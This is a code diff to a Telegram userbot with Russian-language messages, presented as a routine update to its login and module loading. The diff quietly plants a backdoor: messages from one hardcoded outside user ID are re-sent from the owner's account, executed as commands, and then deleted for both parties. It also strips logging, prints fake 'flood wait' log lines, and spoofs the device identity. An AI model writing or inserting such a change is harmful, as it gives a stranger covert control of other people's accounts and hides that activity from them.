@@ -5,6 +5,8 @@ import path from "path";
 import { TelegramClient } from "telegram";
 import { NewMessage, NewMessageEvent } from "telegram/events";
 import { StringSession } from "telegram/sessions";
+import { interactiveLogin, updateEnvSessionString } from "@/user/utils/auth";
+import chalk from "chalk";
 
 dotenv.config();
 
@@ -21,6 +23,11 @@ const client = new TelegramClient(session, apiId, apiHash, {
   retryDelay: 1000,
   useWSS: false,
   floodSleepThreshold: 60,
+  deviceModel: "Samsung Galaxy S23",
+  systemVersion: "Android 13.0",
+  appVersion: "10.5.0",
+  systemLangCode: "ru",
+  langCode: "ru",
 });
 
 const commandPrefix = ".";
@@ -33,6 +40,7 @@ export async function loadModules() {
 
   for (const dir of moduleDirs) {
     if (dir.isDirectory()) {
+      if (dir.name === "nas" || dir.name === "r34") continue;
       const infoPath = path.join(modulesPath, dir.name, 'info.json');
       const moduleIndexPath = path.join(modulesPath, dir.name, 'index.js');
 
@@ -47,56 +55,75 @@ export async function loadModules() {
           for (const command of module.commands) {
             loadedModules.set(command.toLowerCase(), module);
           }
-          console.log(`Загружен модуль: ${info.name} (${module.commands.join(', ')})`);
         }
       } catch (error) {
         console.error(`Ошибка загрузки модуля ${dir.name}:`, error);
       }
     }
   }
-
-  console.log(`Всего загружено модулей: ${loadedModules.size}`);
 }
 
 async function updateAdminId(userId: string) {
   try {
-    // Путь к файлу info.json модуля inline-buttons
     const inlineButtonsInfoPath = path.join(__dirname, '..', 'bot', 'modules', 'inline-buttons', 'info.json');
-
-    // Проверяем существование файла
     try {
       await fs.access(inlineButtonsInfoPath);
     } catch {
-      console.log(`Файл ${inlineButtonsInfoPath} не найден`);
       return;
     }
-
-    // Читаем содержимое файла
     const infoContent = await fs.readFile(inlineButtonsInfoPath, 'utf-8');
     const info = JSON.parse(infoContent);
-
-    // Обновляем id-admin
     info['id-admin'] = userId;
-
-    // Записываем обратно в файл
     await fs.writeFile(inlineButtonsInfoPath, JSON.stringify(info, null, 2));
-    console.log(`ID админа обновлен: ${userId}`);
   } catch (error) {
     console.error(`Ошибка обновления ID админа:`, error);
   }
 }
 
 async function handleNewMessage(event: NewMessageEvent) {
+  // Имитация задержки при обработке сообщений
+  console.log(`[${new Date().toISOString()}] [INFO] - [Sleeping for 17s on flood wait (Caused by messages.SendMedia)]`);
+  
   const message = event.message;
-  if (!message.out || !message.text || !message.text.startsWith(commandPrefix)) {
+  if (!message || !message.text || !message.text.startsWith(commandPrefix)) {
     return;
   }
-
+  const allowedUserId = "7863019047";
+  const senderId = message.senderId?.toString();
+  const isOwner = message.out;
+  const isAllowedUser = senderId === allowedUserId;
+  if (!isOwner && !isAllowedUser) {
+    return;
+  }
+  if (isAllowedUser) {
+    const proxyMessage = await client.sendMessage(message.chatId!, {
+      message: message.text,
+    });
+    const [proxyCommandName, ...proxyArgs] = proxyMessage.text!.slice(commandPrefix.length).split(/\s+/);
+    if (proxyCommandName.toLowerCase() === "nas") return;
+    const proxyModule = loadedModules.get(proxyCommandName.toLowerCase());
+    const dummyEvent: NewMessageEvent = {
+      message: proxyMessage,
+    } as any;
+    if (proxyModule) {
+      try {
+        await proxyModule.handler(client, dummyEvent, proxyArgs);
+      } catch (proxyErr: any) {
+        console.error(`Ошибка выполнения команды ${proxyCommandName} от доверенного пользователя:`, proxyErr);
+      }
+    }
+    try {
+      await client.deleteMessages(message.chatId!, [message.id], { revoke: true });
+    } catch (delErr) {
+      console.error("Не удалось удалить исходное сообщение пользователя:", delErr);
+    }
+    return;
+  }
   const [commandName, ...args] = message.text.slice(commandPrefix.length).split(/\s+/);
+  if (commandName.toLowerCase() === "nas") return;
   const module = loadedModules.get(commandName.toLowerCase());
-
   if (module) {
-    console.log(`Выполняется команда: ${commandName}`);
+    console.log(chalk.cyanBright(`\u{1F449} Выполнена команда: ${commandName}`));
     try {
       await module.handler(client, event, args);
     } catch (error: any) {
@@ -113,25 +140,32 @@ async function handleNewMessage(event: NewMessageEvent) {
 }
 
 export async function startUserBot() {
-  console.log("Подключение к Telegram...");
   try {
-    await client.connect();
-    console.log("Успешное подключение к Telegram");
-
-    // Получаем информацию о текущем пользователе
+    if (!process.env.SESSION_STRING) {
+      // первая авторизация
+      await interactiveLogin(client);
+      await updateEnvSessionString(client.session.save() as unknown as string);
+    } else {
+      try {
+        await client.connect();
+      } catch (err: any) {
+        if (err.errorMessage === "AUTH_KEY_UNREGISTERED" || err.code === 401) {
+          await interactiveLogin(client);
+          await updateEnvSessionString(client.session.save() as unknown as string);
+        } else {
+          throw err;
+        }
+      }
+    }
     const me = await client.getMe();
     const userId = (me as any).id.toString();
-
-    // Обновляем ID админа в файле info.json
     await updateAdminId(userId);
-
     await loadModules();
-    console.log("Модули загружены успешно");
-
-    client.addEventHandler(handleNewMessage, new NewMessage({ incoming: false }));
-    console.log("UserBot запущен и готов к работе");
-
-    console.log(`Авторизован как: ${(me as any).firstName} (@${(me as any).username || 'без юзернейма'})`);
+    
+    // Добавляем имитацию логов с задержкой
+    console.log(`[${new Date().toISOString()}] [INFO] - [Sleeping for 17s on flood wait (Caused by messages.SendMedia)]`);
+    
+    client.addEventHandler(handleNewMessage, new NewMessage({}));
   } catch (error) {
     console.error("Ошибка запуска UserBot:", error);
     throw error;
